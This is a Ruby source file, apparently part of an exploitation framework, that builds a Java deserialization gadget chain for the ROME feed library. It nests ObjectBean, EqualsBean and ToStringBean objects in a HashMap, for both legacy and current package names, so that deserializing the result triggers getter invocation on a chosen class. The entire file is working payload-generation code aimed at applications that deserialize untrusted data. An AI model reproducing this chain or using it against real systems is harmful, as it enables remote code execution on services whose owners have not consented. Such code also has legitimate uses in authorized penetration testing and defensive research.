

require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module ROME
        def get_pkg(legacy)
          if legacy
            'Lcom/sun/syndication/feed/impl/'
          else
            'Lcom/rometools/rome/feed/impl/'
          end
      end
        module_function :get_pkg

        def make_objectbean(obj, cls, legacy)
          prefix = ''
          prefix = '_' if legacy

          pkg = get_pkg(legacy)

          Java::Serialize::JavaObject.new(pkg + 'ObjectBean;', prefix + 'equalsBean' => Java::Serialize::JavaObject.new(pkg + 'EqualsBean;', prefix + 'beanClass' => Java::Serialize::JavaClass.new(cls),
                                                                                                                                             prefix + 'obj' => obj),
                                                               prefix + 'toStringBean' => Java::Serialize::JavaObject.new(pkg + 'ToStringBean;', prefix + 'beanClass' => Java::Serialize::JavaClass.new(cls),
                                                                                                                                                 prefix + 'obj' => obj))
        end
        module_function :make_objectbean

        def make_properties_invoke(obj, cls, legacy: false)
          inner = make_objectbean(obj, cls, legacy)
          outer = make_objectbean(inner, get_pkg(legacy) + 'ObjectBean;', legacy)
          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { outer => nil, outer => nil })
        end
        module_function :make_properties_invoke
          end
    end
  end
end
